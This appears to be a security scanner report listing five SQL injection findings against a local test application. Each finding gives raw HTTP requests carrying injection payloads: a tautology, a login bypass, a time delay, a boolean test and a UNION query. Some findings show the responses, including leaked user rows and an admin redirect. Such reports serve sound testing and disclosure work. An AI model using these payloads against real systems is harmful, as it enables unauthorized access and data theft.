issue.name: SQL injection

issueBackground.p: SQL injection vulnerabilities allow an attacker to interfere with database queries. This may allow an attacker to view, modify, or delete data.

issueDetail.p: The application appears to be vulnerable to SQL injection. Testing with payloads like ' OR '1'='1 resulted in altered application behavior.

issue.request: GET /search?query=test' OR '1'='1 HTTP/1.1 Host: localhost:8080 User-Agent: Mozilla/5.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Cookie: PHPSESSID=abc123def456 Connection: close
issue.response:
HTTP/1.1 200 OK Content-Type: text/html; charset=UTF-8 Content-Length: 5432 Connection: close

Search Results

You searched for: test' OR '1'='1

IDNameEmail
1Adminadmin@example.com
2Useruser@example.com
3Guestguest@example.com

issue.name: SQL injection

issueBackground.p: SQL injection in authentication forms can lead to unauthorized access to the application and sensitive data.

issueDetail.p: The login form is vulnerable to SQL injection in the username parameter. Testing with admin' -- resulted in bypassing authentication.

issue.request:
POST /login HTTP/1.1 Host: localhost:8080 User-Agent: Mozilla/5.0 Content-Type: application/x-www-form-urlencoded Content-Length: 47 Connection: close
username=admin'--&password=anything&submit=Login
issue.response: HTTP/1.1 302 Found Location: /admin Set-Cookie: session_token=eyJhZG1pbiI6dHJ1ZX0 Connection: close

issue.name: SQL injection

issueBackground.p: SQL injection allows attackers to manipulate database queries and potentially extract sensitive information.

issueDetail.p: The category parameter is vulnerable to time-based blind SQL injection. Responses are delayed when SLEEP() is injected.

issue.request: GET /products?category=electronics' AND SLEEP(5)-- HTTP/1.1 Host: localhost:8080 User-Agent: Mozilla/5.0 Accept: text/html Connection: close
issue.response:
HTTP/1.1 200 OK Content-Type: text/html Content-Length: 2145 Connection: close

Product Search

Loading results...

issue.name: SQL injection

issueBackground.p: SQL injection in API endpoints can expose user data and allow database manipulation.

issueDetail.p: The id parameter appears to be vulnerable to boolean-based blind SQL injection. Response differences indicate query manipulation.

issue.request: GET /api/users?id=1' AND '1'='1 HTTP/1.1 Host: localhost:8080 User-Agent: Mozilla/5.0 Accept: application/json Authorization: Bearer token123 Connection: close

issue.name: SQL injection

issueBackground.p: SQL injection vulnerabilities in reporting features can lead to data exfiltration.

issueDetail.p: The filter parameter in the report functionality is susceptible to error-based SQL injection, leaking database information.

issue.request: GET /report?filter=status' UNION SELECT database(),user(),version()-- HTTP/1.1 Host: localhost:8080 User-Agent: Mozilla/5.0 Accept: text/html Cookie: admin_session=xyz789 Connection: close
issue.response:
HTTP/1.1 500 Internal Server Error Content-Type: text/html Content-Length: 892 Connection: close

Error

SQL Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT database()' at line 1
